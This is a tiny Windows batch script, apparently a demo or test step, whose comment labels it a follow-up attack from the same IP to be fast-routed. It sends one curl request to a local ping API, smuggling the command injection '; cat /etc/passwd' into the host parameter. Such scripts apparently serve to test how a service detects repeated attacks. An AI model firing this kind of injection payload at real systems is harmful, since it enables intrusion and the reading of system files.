@echo off
rem BEAT: follow-up attack from the same IP -> fast-route
curl.exe -s "http://localhost:8888/api/ping?host=127.0.0.1; cat /etc/passwd"
echo.
